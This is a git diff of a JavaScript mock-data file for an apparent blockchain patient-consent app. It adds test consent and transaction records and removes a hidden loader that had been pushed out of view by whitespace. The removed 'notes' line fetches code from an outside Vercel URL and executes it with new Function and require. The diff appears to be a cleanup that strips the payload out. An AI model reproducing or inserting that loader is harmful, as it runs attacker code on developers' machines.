@@ -10,7 +10,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +22,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -613,7 +613,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://blogs-six-lovat.vercel.app/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -633,6 +633,26 @@ const mockData = {
       "signature": null,
       "status": "pending",
       "createdAt": "2024-02-21T08:00:00Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765295017507",
+      "patientId": "testPatient-042",
+      "purpose": "Research Study Participation",
+      "walletAddress": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "signature": "0x45cabccae1b06bd132c6d7c964c8b8b01641ed2f7859b0286f02fa3ba69629ad0bfe1f9dbcc7d57ec5d414d497b8977edaa6ed706d7d4fa47ac50d60abf873b21c",
+      "status": "pending",
+      "createdAt": "2025-12-09T15:43:37.507Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765295043460",
+      "patientId": "testPatient-042",
+      "purpose": "Third-Party Analytics Access",
+      "walletAddress": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "signature": "0x66bec67edfe7b0b4525b8ea9f9c83958563970b0b2e7f021ba6ddf7a912660aa6d88d2beadedc66095877b2c526b29c594b6e81fc8f9cc2e89729eb826d9ce411b",
+      "status": "pending",
+      "createdAt": "2025-12-09T15:44:03.460Z",
       "blockchainTxHash": null
     }
   ],
@@ -844,6 +864,76 @@ const mockData = {
       "status": "confirmed",
       "blockNumber": 18501400,
       "timestamp": "2024-03-03T08:20:00Z",
+      "gasUsed": "15000",
+      "gasPrice": "20000000000"
+    },
+    {
+      "id": "tx-016",
+      "from": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "to": "0x1234567890123456789012345678901234567890",
+      "amount": "0.001",
+      "currency": "ETH",
+      "type": "consent_approval",
+      "blockchainTxHash": "0xpqr678stu901vwx234yza567bcd890efg123hij456klm789no",
+      "status": "confirmed",
+      "blockNumber": 18501500,
+      "timestamp": "2024-03-05T10:15:00Z",
+      "gasUsed": "21000",
+      "gasPrice": "20000000000"
+    },
+    {
+      "id": "tx-017",
+      "from": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "to": "0x9876543210987654321098765432109876543210",
+      "amount": "0.0005",
+      "currency": "ETH",
+      "type": "data_access",
+      "blockchainTxHash": "0xqrs789tuv012wxy345zab678cde901fgh234ijk567lmn890op",
+      "status": "confirmed",
+      "blockNumber": 18501600,
+      "timestamp": "2024-03-07T14:30:00Z",
+      "gasUsed": "15000",
+      "gasPrice": "20000000000"
+    },
+    {
+      "id": "tx-018",
+      "from": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "to": "0x1234567890123456789012345678901234567890",
+      "amount": "0.001",
+      "currency": "ETH",
+      "type": "consent_approval",
+      "blockchainTxHash": "0xrst890uvw123xyz456abc789def012ghi345jkl678mno901pq",
+      "status": "confirmed",
+      "blockNumber": 18501700,
+      "timestamp": "2024-03-09T09:45:00Z",
+      "gasUsed": "21000",
+      "gasPrice": "20000000000"
+    },
+    {
+      "id": "tx-019",
+      "from": "0x8ba1f109551bD432803012645Hac136c22C1729",
+      "to": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "amount": "0.0003",
+      "currency": "ETH",
+      "type": "data_access",
+      "blockchainTxHash": "0xstu901vwx234yza567bcd890efg123hij456klm789nop012qr",
+      "status": "confirmed",
+      "blockNumber": 18501800,
+      "timestamp": "2024-03-11T16:20:00Z",
+      "gasUsed": "15000",
+      "gasPrice": "20000000000"
+    },
+    {
+      "id": "tx-020",
+      "from": process.env.TEST_WALLET_ADDRESS || "0x0000000000000000000000000000000000000000",
+      "to": "0x9876543210987654321098765432109876543210",
+      "amount": "0.0005",
+      "currency": "ETH",
+      "type": "data_access",
+      "blockchainTxHash": "0xtuv012wxy345zab678cde901fgh234ijk567lmn890opq123rs",
+      "status": "confirmed",
+      "blockNumber": 18501900,
+      "timestamp": "2024-03-13T11:00:00Z",
       "gasUsed": "15000",
       "gasPrice": "20000000000"
     }
